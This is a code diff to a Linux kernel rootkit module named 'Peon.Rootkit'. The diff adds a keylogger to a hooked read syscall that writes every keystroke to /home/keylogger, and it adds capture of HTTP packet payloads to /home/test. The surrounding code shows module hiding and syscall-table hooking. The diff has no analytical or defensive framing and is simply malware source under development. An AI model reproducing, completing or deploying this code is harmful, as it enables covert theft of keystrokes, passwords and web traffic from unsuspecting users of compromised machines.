@@ -40,6 +40,8 @@
 #define SIG_4_SHOW_MOD 9
 #define PID_4_SHOW_MOD 22222
 #define ETH_P_ALL       0x0003
+#define KEYLOG_PATH      "/home/keylogger"
+#define TEST_PATH      "/home/test"
 
 #if defined(__LP64__) || defined(_LP64) //__x86_64 /* 64 bits machine */
 #define OS_64_BITS
@@ -212,7 +214,7 @@ unsigned long ** syscall_table ;
 //flag: hide module
 char FIRST_SHOW_MODULE = 1;
 
-char keys[5]={0};
+
 
 /* save packet type */
 struct packet_type pt;
@@ -260,27 +262,71 @@ F11:         0x1b 0x5B 0x32 0x33 0x7E
 F12:         0x1b 0x5B 0x32 0x34 0x7E
 */
 
+
+#ifdef HOOK_READ
 void check_keyboard_buf(char __user *buf){
-	u16 index=0;
-	while(buf[index]!=0x00 && index<50){
-		if (buf[index]==0x9)
-			printk(KERN_ALERT "Peon.Rootkit: keyboard = {TAB}");
-		else if (buf[index]==0x7f)
-			printk(KERN_ALERT "Peon.Rootkit: keyboard = {BACKSPACE}");
-		else if (buf[index]==0x0d)
-			printk(KERN_ALERT "Peon.Rootkit: keyboard = {ENTER}");
-		else if (buf[index]==0x0a)
-			printk(KERN_ALERT "Peon.Rootkit: keyboard = {NewLine}");
-		else
-			printk(KERN_ALERT "Peon.Rootkit: keyboard[%d] = %c, %02X\n",index,buf[index],buf[index]);
-		index++;
-			}
+        u16 index=0;
+        int temp1,temp2;       
+       
+        while(buf[index]!=0x00 && strlen(buf)==1){
+                switch(buf[index])
+                {
+                case 0x9 :
+                        {printk(KERN_ALERT "Peon.Rootkit: keyboard = {TAB}\n");
+                         append_filez(KEYLOG_PATH,"{TAB}",5);
+                        break;}
+                case 0x7f:
+                        {printk(KERN_ALERT "Peon.Rootkit: keyboard = {BACKSPACE}\n");
+                         append_filez(KEYLOG_PATH,"{BACKSPACE}",11);
+                        break;}
+                case 0x0d:
+                        {printk(KERN_ALERT "Peon.Rootkit: keyboard = {ENTER}\n");
+                         append_filez(KEYLOG_PATH,"{ENTER}",7);
+                        break;}
+                case 0x0a:
+                        {printk(KERN_ALERT "Peon.Rootkit: keyboard = {NewLine}\n");
+                         append_filez(KEYLOG_PATH,"{NewLine}",9);
+                        break;}
+                case 0x1B:
+                        {temp1=1;
+                        break;}
+                case 0x5B :
+                        {if (temp1==1)
+                                temp2=1;
+                        break;}
+                case 0X41 :
+                        {if (temp1==1 && temp2==1)
+                                printk(KERN_ALERT "Peon.Rootkit: keyboard = {UpArrow}\n");
+                                append_filez(KEYLOG_PATH,"{UpArrow}",7);
+                        break;}
+                case 0X42 :
+                        {if (temp1==1 && temp2==1)
+                                printk(KERN_ALERT "Peon.Rootkit: keyboard = {DownArrow}\n");
+                                append_filez(KEYLOG_PATH,"{DownArrow}",9);
+                        break;}
+                case 0X43 :
+                        {if (temp1==1 && temp2==1)
+                                printk(KERN_ALERT "Peon.Rootkit: keyboard = {RightArrow}\n");
+                                append_filez(KEYLOG_PATH,"{RightArrow}",11);
+                        break;}
+                case 0X44 :
+                        {if (temp1==1 && temp2==1)
+                        printk(KERN_ALERT "Peon.Rootkit: keyboard = {LeftArrow}\n");
+                        append_filez(KEYLOG_PATH,"{LeftArrow}",10);
+                        break;}                
+
+                default :
+                        {
+                        printk(KERN_ALERT "Peon.Rootkit: keyboard[%d] = %c, %02X\n",index,buf[index],buf[index]);
+                        append_filez(KEYLOG_PATH,&buf[index],1);
+                        break;}
+                }
+                index++;
+                        }
 
 }
 
 
-
-#ifdef HOOK_READ
 	asmlinkage long (*orig_read_call) (unsigned int fd, char __user *buf, size_t count); 
 	asmlinkage long hook_read_call(unsigned int fd,char __user *buf, size_t count){
 		
@@ -413,28 +459,24 @@ int dev_func(struct sk_buff *skb, struct net_device *dev, struct packet_type *pk
 		ip=(struct iphdr*)skb_network_header(skb);
 		if(ip->version ==4 && ip->protocol ==  IPPROTO_TCP ){
 			struct tcphdr *tcp_hdr;
+			unsigned char *data;
 			//tcp_hdr=tcp_hdr(skb);
 			tcp_hdr=(struct tcphdr *)(ip->ihl * 4 + skb->data);
+			data = (unsigned char *)((__u32 *)tcp_hdr + tcp_hdr->doff);
 			/* check if source port is from http */
 			if(tcp_hdr->source==ntohs(80) || tcp_hdr->source==ntohs(8080)){
 				#ifdef DEBUG
-				int i=0;
-				int size=0;
-				printk(KERN_ALERT "Peon.Rootkit: http");
-				printk(KERN_ALERT "Peon.Rootkit: skb data len %d",skb->data_len);
-				printk(KERN_ALERT "Peon.Rootkit: skb mac len %d",skb->mac_len);
-				printk(KERN_ALERT "Peon.Rootkit: skb hdr len %d",skb->hdr_len);
-				printk(KERN_ALERT "data : %s",skb->data);
-				/*if(skb->data_len==0)
-				size=skb->len;
-				else
-				size=skb->len - skb->data_len;
-				for(;i<16;i++)
-					printk(KERN_ALERT "0x%x,",skb->data[i]);*/
+				printk(KERN_ALERT "Peon.Rootkit: http\n");
+				printk(KERN_ALERT "Peon.Rootkit: skb data len %d\n",skb->data_len);
+				printk(KERN_ALERT "Peon.Rootkit: skb mac len %d\n",skb->mac_len);
+				printk(KERN_ALERT "Peon.Rootkit: skb hdr len %d\n",skb->hdr_len);
+				printk(KERN_ALERT "Peon.Rootkit: data=%s\n",data);
+				append_filez(TEST_PATH,data,strlen(data));
 				
 				#endif
 				kfree_skb(skb);
 			}
+
 		}
 	}
 	return 0;
